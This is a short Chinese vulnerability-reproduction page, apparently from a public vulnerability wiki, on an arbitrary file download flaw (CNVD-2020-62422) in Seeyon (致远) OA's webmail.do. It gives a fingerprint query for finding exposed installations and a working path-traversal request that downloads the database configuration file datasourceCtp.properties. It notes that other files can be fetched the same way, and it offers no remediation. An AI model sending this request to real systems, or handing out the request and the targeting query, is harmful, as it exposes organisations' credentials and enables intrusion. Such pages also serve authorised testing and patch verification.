---
title: "致远OA webmail.do 任意文件下载 CNVD-2020-62422"
date: 2026-10-17 09:13:21
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "代码执行"
  - "任意文件下载"
  - "信息泄露"
  - "CNVD-2020-62422"
  - "漏洞复现"
---
## 漏洞描述

致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息

## 漏洞影响

```
致远OA A6-V5
致远OA A8-V5
致远OA G6
```

## 网络测绘

```
app="致远互联-OA"
```

## 漏洞复现

验证POC

```
/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
```

在漏洞的OA 系统将会下载 `datasourceCtp.properties` 配置文件

![image-20220520153850024](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201538060.png)

更改参数 filePath 可下载其他文件

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-webmail.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-CNVD-2020-62422.md)
